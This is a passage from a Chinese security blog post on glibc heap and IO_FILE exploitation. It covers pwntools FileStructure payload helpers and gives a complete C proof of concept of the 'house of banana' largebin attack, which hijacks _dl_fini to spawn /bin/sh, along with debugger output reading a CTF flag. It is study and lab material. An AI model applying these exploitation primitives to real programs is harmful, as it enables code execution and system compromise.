</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>fake<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x110</span> <span style="color:#ff79c6">=</span> fake<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x40</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 0x48 是 d_un 结构体指针
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>fake<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x48</span> <span style="color:#ff79c6">=</span> fake<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x58</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 后面加的那个东西
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>fake<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x58</span> <span style="color:#ff79c6">=</span> shell    <span style="color:#6272a4">// 0 + shell 执行shell
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// map.l_info[28]。由上可知，为0，同时为 26 的 d_tag 成员
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>fake<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x120</span> <span style="color:#ff79c6">=</span> fake<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x48</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// l_info[28] 的 d_un 指针。 sz=1
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>fake<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x50</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">8</span>
</span></span></code></pre></div><h2 id="pwntools-filepointer">pwntools filepointer</h2>
<p>其实看pwntools文档可以看出其中对 <code>IO_FILE</code> 也存在很多可以利用的点</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwnlib.filepointer <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
</span></span></code></pre></div><ol>
<li>IO_FILE 结构体</li>
</ol>
<ul>
<li><code>_wide_data</code> 就是我们现在常利用的点。</li>
<li>改变成员也只是需要 <code>fs.flags = 0x123</code> 直接赋值</li>
<li>两个 unknown 变量填充结构体</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>FileStructure(null<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> FileStructure()
</span></span><span style="display:flex;"><span>{ flags: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _IO_read_ptr: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _IO_read_end: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _IO_read_base: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _IO_write_base: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _IO_write_ptr: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _IO_write_end: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _IO_buf_base: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _IO_buf_end: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _IO_save_base: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _IO_backup_base: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _IO_save_end: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> markers: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> chain: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> fileno: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _flags2: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _old_offset: <span style="color:#bd93f9">0xffffffff</span>
</span></span><span style="display:flex;"><span> _cur_column: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _vtable_offset: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _shortbuf: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> unknown1: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _lock: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _offset: <span style="color:#bd93f9">0xffffffffffffffff</span>
</span></span><span style="display:flex;"><span> _codecvt: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> _wide_data: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> unknown2: <span style="color:#bd93f9">0x0</span>
</span></span><span style="display:flex;"><span> vtable: <span style="color:#bd93f9">0x0</span>}
</span></span></code></pre></div><ol start="2">
<li>house of orange</li>
</ol>
<ul>
<li>io_list_all 地址</li>
<li>伪造的 vtable 地址</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> fileStr <span style="color:#ff79c6">=</span> FileStructure(<span style="color:#bd93f9">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> payload <span style="color:#ff79c6">=</span> fileStr<span style="color:#ff79c6">.</span>orange(io_list_all<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0xfacef00d</span>, vtable<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0xcafebabe</span>)
</span></span></code></pre></div><ol start="3">
<li>stdout leak</li>
</ol>
<ul>
<li>从 addr 泄露 size 大小的数据</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fileStr <span style="color:#ff79c6">=</span> FileStructure(<span style="color:#bd93f9">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> payload <span style="color:#ff79c6">=</span> fileStr<span style="color:#ff79c6">.</span>write(addr<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0xcafebabe</span>, size<span style="color:#ff79c6">=</span><span style="color:#bd93f9">100</span>)
</span></span></code></pre></div><ol start="4">
<li>packing，因为我们需要伪造file结构体，因此我们可以使用如下函数</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># 根据 context.arch打包， 类似 p32，p64 函数</span>
</span></span><span style="display:flex;"><span>flat([
</span></span><span style="display:flex;"><span>	  con1,
</span></span><span style="display:flex;"><span>	  con2
</span></span><span style="display:flex;"><span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># offset: con, 类似于 cyclic(offset) + p64(con)</span>
</span></span><span style="display:flex;"><span>flat({
</span></span><span style="display:flex;"><span>	<span style="color:#bd93f9">0xe0</span>: <span style="color:#bd93f9">100</span>
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 相对偏移</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&gt;&gt;&gt;</span> flat({<span style="color:#bd93f9">0xe0</span>:{<span style="color:#bd93f9">0x0</span>: <span style="color:#bd93f9">100</span>, <span style="color:#bd93f9">0x10</span>: <span style="color:#bd93f9">200</span>}})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 同时可以指定填充内容 和 总长度，因为我们伪造结构体需要满足一定条件</span>
</span></span><span style="display:flex;"><span>flat({<span style="color:#bd93f9">0xe0</span>:<span style="color:#bd93f9">0x100</span>}, filler<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>, length<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x200</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 用法和flat({}) 一样 官方文档是 alias of flat</span>
</span></span><span style="display:flex;"><span>fit({})
</span></span></code></pre></div><h2 id="测试">测试</h2>
<p>最好手动调试一下 largebin attack 和 house_of_banana。</p>
<h3 id="house-of-banana-1">house of banana</h3>
<p>参考一下 <a href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">house_of_banana源码分析</a>这一篇文章的demo</p>
<ul>
<li>注意改rtld相关指针和libc的偏移大小</li>
</ul>
<p>makefile</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">CC</span> :<span style="color:#ff79c6">=</span> gcc
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">CFLAFS</span> :<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span>g 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">all</span>: house_of_banana large_bin_attack
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">default</span><span style="color:#ff79c6">:</span> house_of_banana  large_bin_attack
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">TARGET</span> :<span style="color:#ff79c6">=</span> house_of_banana  large_bin_attack
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">house_of_banana</span>: house_of_banana.c 
</span></span><span style="display:flex;"><span>	$(CC) $(CFLAFS) $<span style="color:#ff79c6">^</span> <span style="color:#ff79c6">-</span>o $@
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">large_bin_attack</span>: large_bin_attack.c 
</span></span><span style="display:flex;"><span>	$(CC) $(CFLAFS) $<span style="color:#ff79c6">^</span> <span style="color:#ff79c6">-</span>o $@
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">clean</span>:
</span></span><span style="display:flex;"><span>	rm <span style="color:#ff79c6">-</span>f $(TARGET) 
</span></span></code></pre></div><p>house of banana</p>
<ul>
<li>伪造结构体 l_next 为 0</li>
<li>l_init_called 一个比较神奇的数字，具体的libc打印</li>
<li>ubuntu 22.04 LTS 测试一下，在gdb 下可以执行一个命令就会崩溃。</li>
<li>高版本libc 没有patch进行测试，但是根据源码可行（理论上）</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdint.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">shell</span>() { 
</span></span><span style="display:flex;"><span>  execve(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">uint64_t</span> <span style="color:#50fa7b">get_libc_base</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64_t</span> to;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64_t</span> from;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">0x400</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  FILE <span style="color:#ff79c6">*</span>file;
</span></span><span style="display:flex;"><span>  file <span style="color:#ff79c6">=</span> fopen(<span style="color:#f1fa8c">&#34;/proc/self/maps&#34;</span>, <span style="color:#f1fa8c">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">while</span> (fgets(buf, <span style="color:#ff79c6">sizeof</span>(buf), file)) {
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// printf(&#34;%s\n&#34;, buf);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span> (strstr(buf, <span style="color:#f1fa8c">&#34;libc.so.6&#34;</span>) <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) {
</span></span><span style="display:flex;"><span>      sscanf(buf, <span style="color:#f1fa8c">&#34;%lx-%lx&#34;</span>, <span style="color:#ff79c6">&amp;</span>from, <span style="color:#ff79c6">&amp;</span>to);
</span></span><span style="display:flex;"><span>      fclose(file);
</span></span><span style="display:flex;"><span>      printf(<span style="color:#f1fa8c">&#34;libc =&gt; %#lx-%#lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, from, to);
</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">// getchar();
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>      <span style="color:#ff79c6">return</span> from;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>  setvbuf(stdin, <span style="color:#8be9fd;font-style:italic">NULL</span>, _IONBF, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  setvbuf(stdout, <span style="color:#8be9fd;font-style:italic">NULL</span>, _IONBF, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  setvbuf(stderr, <span style="color:#8be9fd;font-style:italic">NULL</span>, _IONBF, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64_t</span> libc_base <span style="color:#ff79c6">=</span> get_libc_base();
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64_t</span> rtld_global <span style="color:#ff79c6">=</span> libc_base <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x3fd040</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>next_node <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)(rtld_global <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x41ec8</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>p1 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x428</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>g1 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x18</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>p2 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x418</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>g2 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x18</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  free(p1);
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>g3 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x438</span>);  <span style="color:#6272a4">// force p1 insert in to the largebin
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  free(p2);
</span></span><span style="display:flex;"><span>  p1[<span style="color:#bd93f9">3</span>] <span style="color:#ff79c6">=</span> ((<span style="color:#8be9fd">uint64_t</span>)next_node <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x20</span>);  <span style="color:#6272a4">// push p2 into unsoteded bin
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>g4 <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x438</span>);          <span style="color:#6272a4">// force p2 insert in to the largebin
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// 类似一个 uaf 修改
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">uint64_t</span> fake <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">uint64_t</span>)p2 <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span>;  <span style="color:#6272a4">// chunk_header
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)(fake <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x28</span>) <span style="color:#ff79c6">=</span> fake;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)(fake <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x31c</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4011d</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)(fake <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x110</span>) <span style="color:#ff79c6">=</span> fake <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x40</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)(fake <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x48</span>) <span style="color:#ff79c6">=</span> fake <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x58</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)(fake <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x58</span>) <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">uint64_t</span>)shell;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)(fake <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x120</span>) <span style="color:#ff79c6">=</span> fake <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x48</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)(fake <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x50</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x8</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// 修改 _rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next 的地址为 p2
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#6272a4">// 最后一个linkmap链表遍历 p2
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#6272a4">// 建议 p *(struct link_map *) p2_addr 看一下
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// 问题：assert i &lt; nloaded 错误，因此要将 (struct linkmap *p2) -&gt;l_next 置为0
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  p2[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// l_init_called 为0
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#6272a4">// *(uint64_t*)(fake+0x31c) = 0x4011d; 像是一个magic number
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#6272a4">// 必须为其余类型的值，因此打印出来替换
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// 最后的程序崩溃了😥.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/*
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">    0x7ffff7fc9242 &lt;_dl_fini+514&gt;    nop    word ptr [rax + rax]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">    0x7ffff7fc9248 &lt;_dl_fini+520&gt;    mov    qword ptr [rbp - 0x38], rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">  ► 0x7ffff7fc924c &lt;_dl_fini+524&gt;    call   qword ptr [rax] &lt;shell&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">  pwndbg&gt; bt
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">    #0  0x000055555555529b in shell () at house_of_banana.c:7
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">    #1  0x00007ffff7fc924e in _dl_fini () at ./elf/dl-fini.c:142
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">    #2  0x00007ffff7c45495 in __run_exit_handlers (status=0,
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">    # ...
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">  */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// 但是发现在gdb 调试情况下可以执行一次命令就会崩溃
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">/*
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">pwndbg&gt; c
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">Continuing.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">process 6591 is executing new program: /usr/bin/dash
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">Error in re-setting breakpoint 2: Function &#34;shell&#34; not defined.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">[Thread debugging using libthread_db enabled]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">Using host libthread_db library &#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">$ cat flag.txt
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">[Attaching after Thread 0x7ffff7fa7740 (LWP 6591) vfork to child process 6594]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">[New inferior 2 (process 6594)]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">[Thread debugging using libthread_db enabled]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">Using host libthread_db library &#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">[Detaching vfork parent process 6591 after child exec]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">[Inferior 1 (process 6591) detached]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">process 6594 is executing new program: /usr/bin/cat
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">[Thread debugging using libthread_db enabled]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">Using host libthread_db library &#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">flag{house_of_banana_is_good}
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">[Inferior 2 (process 6594) exited normally]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">$ [5]  + 6580 suspended (tty output)  gdb house_of_banana
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="参考">参考</h2>
<ul>
<li><a href="https://bbs.kanxue.com/thread-275968.htm">IO_FILE 入门</a></li>
<li><a href="https://bbs.kanxue.com/thread-273895.htm">House of cat新型glibc中IO利用手法解析|安全招聘|kanxue.com</a></li>
<li><a href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple 一种新的glibc中IO攻击方法</a></li>
<li><a href="https://www.anquanke.com/post/id/222948">house of banana-安全客</a></li>
</ul>
		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/io_file">IO_FILE</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		<div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        var disqus_shortname = 'ldrx30';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>

</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2024  © ldrx30 |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
